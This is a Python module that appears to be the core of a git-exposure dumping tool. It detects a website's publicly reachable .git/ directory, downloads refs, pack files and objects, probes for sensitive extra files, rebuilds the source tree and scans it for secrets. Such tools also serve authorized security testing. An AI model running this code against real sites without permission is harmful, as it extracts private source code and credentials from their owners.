"""Main dumper: orchestrates discovery, download, parse, restore, scan."""
from __future__ import annotations

import asyncio
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional
from urllib.parse import urljoin

import aiofiles  # type: ignore[import-not-found]

from ..http_client import HttpClient
from ..logger import get_logger
from ..settings import KNOWN_GIT_FILES, OBJECT_DIR_PREFIXES, SENSITIVE_EXTRAS
from .detector import DetectionResult, GitDetector
from .extractor import restore_worktree
from .index import parse_index
from .objects import dump_object, parse_loose, sha_path
from .pack import discover_pack_names, download_pack, explode_pack
from .refs import discover_refs, resolve_head_sha, shas_from_refs
from .secrets import SecretHit, scan_directory


@dataclass
class DumpStats:
    target_base_url: str = ""
    git_root: str = ""
    detection_method: str = ""
    listing_enabled: bool = False
    refs_discovered: int = 0
    packs_discovered: int = 0
    objects_downloaded: int = 0
    objects_from_packs: int = 0
    bytes_total: int = 0
    head_files_restored: int = 0
    secrets_found: int = 0
    extras_found: list[str] = field(default_factory=list)
    duration_seconds: float = 0.0
    head_sha: Optional[str] = None
    secret_hits: list[SecretHit] = field(default_factory=list)


class GitDumper:
    """End-to-end runner."""

    def __init__(
        self,
        target: str,
        out_dir: Path,
        client: HttpClient,
        *,
        skip_extras: bool = False,
        skip_packs: bool = False,
        skip_secrets: bool = False,
        skip_restore: bool = False,
    ) -> None:
        self.target = target.rstrip("/")
        self.out_dir = out_dir
        self.git_dir = out_dir / ".git"
        self.client = client
        self.log = get_logger()
        self.skip_extras = skip_extras
        self.skip_packs = skip_packs
        self.skip_secrets = skip_secrets
        self.skip_restore = skip_restore
        self.stats = DumpStats(target_base_url=target)

    # ------------------------------------------------------------------ run

    async def run(self) -> DumpStats:
        t0 = time.monotonic()
        self.log.banner_line("phase 1 :: detection")
        await self.client.calibrate_soft_404(self.target)
        detector = GitDetector(self.client)
        det = await detector.detect(self.target)
        if not det:
            self.log.critical("Target does not appear to expose .git/. Aborting.")
            self.stats.duration_seconds = time.monotonic() - t0
            return self.stats

        self.stats.git_root = det.base_url
        self.stats.detection_method = det.method
        self.stats.listing_enabled = det.listing_enabled
        self.log.kv("base", det.base_url)
        self.log.kv("method", det.method)
        self.log.kv("listing", "yes" if det.listing_enabled else "no")

        # Output structure
        self.git_dir.mkdir(parents=True, exist_ok=True)

        # Phase 2: well-known files
        self.log.banner_line("phase 2 :: well-known files")
        await self._download_known_files(det.base_url)

        # Phase 3: refs discovery
        self.log.banner_line("phase 3 :: refs discovery")
        refs = await discover_refs(self.client, det.base_url)
        self.stats.refs_discovered = sum(1 for k in refs if not k.endswith("->"))
        self.log.info(f"discovered {self.stats.refs_discovered} refs")
        for k, v in list(refs.items())[:20]:
            self.log.debug(f"  ref {k} = {v}")
        # Persist refs locally
        await self._persist_refs(refs)

        # Phase 4: packs
        if not self.skip_packs:
            self.log.banner_line("phase 4 :: pack files")
            pack_names = await discover_pack_names(self.client, det.base_url)
            self.stats.packs_discovered = len(pack_names)
            self.log.info(f"discovered {len(pack_names)} pack(s)")
            for name in pack_names:
                pack_path, _ = await download_pack(
                    self.client, det.base_url, name, self.git_dir
                )
                if pack_path and pack_path.exists():
                    try:
                        count = explode_pack(pack_path, self.git_dir)
                        self.stats.objects_from_packs += count
                        self.log.stats["objects"] = (
                            self.stats.objects_downloaded
                            + self.stats.objects_from_packs
                        )
                    except Exception as e:
                        self.log.error(f"explode_pack failed for {name}: {e}")

        # Phase 5: recursive object download (BFS)
        self.log.banner_line("phase 5 :: loose object walk")
        seeds = shas_from_refs(refs)

        # Add index entries
        index_path = self.git_dir / "index"
        if index_path.exists():
            for path, sha in parse_index(index_path).items():
                self.log.trace(f"index → {path}: {sha[:10]}")
                seeds.add(sha)

        self.log.info(f"BFS seeds: {len(seeds)}")
        await self._walk_objects(det.base_url, seeds)

        # Phase 5b: if listing enabled, mirror objects/ tree wholesale
        if det.listing_enabled:
            self.log.banner_line("phase 5b :: object directory mirror")
            await self._mirror_object_dirs(det.base_url)

        # Phase 6: extras
        if not self.skip_extras:
            self.log.banner_line("phase 6 :: extras scan")
            await self._probe_extras()

        # Phase 7: restore working tree
        if not self.skip_restore:
            self.log.banner_line("phase 7 :: restore worktree")
            try:
                info = restore_worktree(self.git_dir, self.out_dir)
                self.stats.head_sha = info.get("head_sha")
                self.stats.head_files_restored = info.get("head_files", 0)
            except Exception as e:
                self.log.error(f"worktree restore failed: {e}")

        # Phase 8: secret scan
        if not self.skip_secrets:
            self.log.banner_line("phase 8 :: secret scan")
            hits = scan_directory(self.out_dir, ignore=(".git",))
            self.stats.secret_hits = hits
            self.stats.secrets_found = len(hits)
            self.log.stats["secrets"] = len(hits)
            self._render_secrets_table(hits)

        self.stats.duration_seconds = round(time.monotonic() - t0, 2)
        self.log.stats_panel()
        return self.stats

    # ------------------------------------------------------------------ helpers

    async def _save(self, relative: str, data: bytes) -> Path:
        path = self.git_dir / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        async with aiofiles.open(path, "wb") as f:
            await f.write(data)
        self.stats.bytes_total += len(data)
        return path

    async def _download_known_files(self, base_url: str) -> None:
        async def one(name: str) -> None:
            r = await self.client.get(urljoin(base_url, name))
            if r.ok:
                await self._save(name, r.body)
                self.log.success(f"saved {name} ({len(r.body)}B)")

        await asyncio.gather(*(one(n) for n in KNOWN_GIT_FILES))

    async def _persist_refs(self, refs: dict[str, str]) -> None:
        # Write packed-refs aggregate (if not already saved)
        existing = self.git_dir / "packed-refs"
        if not existing.exists():
            lines = ["# pack-refs with: peeled fully-peeled sorted\n"]
            for ref, sha in refs.items():
                if ref.endswith("->") or ref.startswith("reflog"):
                    continue
                lines.append(f"{sha} {ref}\n")
            existing.write_text("".join(lines))
            self.log.debug(f"wrote synthetic packed-refs ({len(refs)} entries)")
        # Per-ref files
        for ref, sha in refs.items():
            if "->" in ref or ":" in ref:
                continue
            ref_path = self.git_dir / ref
            ref_path.parent.mkdir(parents=True, exist_ok=True)
            if not ref_path.exists():
                ref_path.write_text(sha + "\n")

    async def _walk_objects(self, base_url: str, seeds: set[str]) -> None:
        queue: asyncio.Queue[str] = asyncio.Queue()
        seen: set[str] = set()
        for s in seeds:
            await queue.put(s)
            seen.add(s)

        async def worker() -> None:
            while True:
                try:
                    sha = await asyncio.wait_for(queue.get(), timeout=2.0)
                except asyncio.TimeoutError:
                    return
                try:
                    await self._fetch_object(base_url, sha, queue, seen)
                finally:
                    queue.task_done()

        # Hard cap on object workers (separate from HTTP semaphore)
        workers = [asyncio.create_task(worker()) for _ in range(8)]
        await queue.join()
        for w in workers:
            w.cancel()
        await asyncio.gather(*workers, return_exceptions=True)

    async def _fetch_object(
        self,
        base_url: str,
        sha: str,
        queue: asyncio.Queue,
        seen: set[str],
    ) -> None:
        # Skip if already on disk (e.g. exploded from pack)
        dest = self.git_dir / sha_path(sha)
        if dest.exists():
            try:
                async with aiofiles.open(dest, "rb") as f:
                    raw = await f.read()
                parsed = parse_loose(raw, expected_sha=sha)
                if parsed:
                    for ref in parsed.referenced_shas:
                        if ref not in seen:
                            seen.add(ref)
                            await queue.put(ref)
                return
            except Exception:
                pass
        url = urljoin(base_url, sha_path(sha))
        r = await self.client.get(url)
        if not r.ok:
            return
        parsed = parse_loose(r.body, expected_sha=sha)
        if not parsed:
            self.log.warning(f"object {sha[:10]} failed validation")
            return
        await self._save(sha_path(sha), r.body)
        self.stats.objects_downloaded += 1
        self.log.success(
            f"object {parsed.type:<6} {sha[:10]}…  ({parsed.size}B, "
            f"refs={len(parsed.referenced_shas)})"
        )
        self.log.stats["objects"] = (
            self.stats.objects_downloaded + self.stats.objects_from_packs
        )
        for ref in parsed.referenced_shas:
            if ref not in seen:
                seen.add(ref)
                await queue.put(ref)

    async def _mirror_object_dirs(self, base_url: str) -> None:
        """When server lists objects/, scrape every aa/ subdir."""
        import re

        href_re = re.compile(rb'href="([0-9a-f]{38})"')

        async def one(prefix: str) -> None:
            url = urljoin(base_url, f"objects/{prefix}/")
            r = await self.client.get(url)
            if not r.ok:
                return
            for m in href_re.finditer(r.body):
                rest = m.group(1).decode()
                sha = prefix + rest
                dest = self.git_dir / sha_path(sha)
                if dest.exists():
                    continue
                obj_resp = await self.client.get(urljoin(url, rest))
                if obj_resp.ok:
                    parsed = parse_loose(obj_resp.body, expected_sha=sha)
                    if parsed:
                        await self._save(sha_path(sha), obj_resp.body)
                        self.stats.objects_downloaded += 1
                        self.log.success(f"mirror obj {sha[:10]} ({parsed.type})")

        await asyncio.gather(*(one(p) for p in OBJECT_DIR_PREFIXES))

    async def _probe_extras(self) -> None:
        async def one(name: str) -> None:
            url = urljoin(self.target + "/", name)
            r = await self.client.get(url)
            if r.ok and len(r.body) > 0:
                self.stats.extras_found.append(name)
                target_path = self.out_dir / ".gitexpose_extras" / name
                target_path.parent.mkdir(parents=True, exist_ok=True)
                target_path.write_bytes(r.body)
                self.log.success(f"extra: {name} ({len(r.body)}B)")

        await asyncio.gather(*(one(n) for n in SENSITIVE_EXTRAS))

    def _render_secrets_table(self, hits) -> None:
        if not hits:
            return
        from rich.table import Table

        table = Table(
            title=f"[bold red]Secrets discovered ({len(hits)})[/bold red]",
            show_lines=False,
            header_style="bold magenta",
        )
        table.add_column("rule", style="cyan", no_wrap=True)
        table.add_column("location", style="white")
        table.add_column("preview", style="yellow")
        table.add_column("H", justify="right", style="dim")
        for h in hits[:50]:
            table.add_row(h.rule_id, f"{h.file}:{h.line}", h.match, str(h.entropy))
        self.log.console.print(table)
        if len(hits) > 50:
            self.log.info(f"… and {len(hits) - 50} more (see report)")
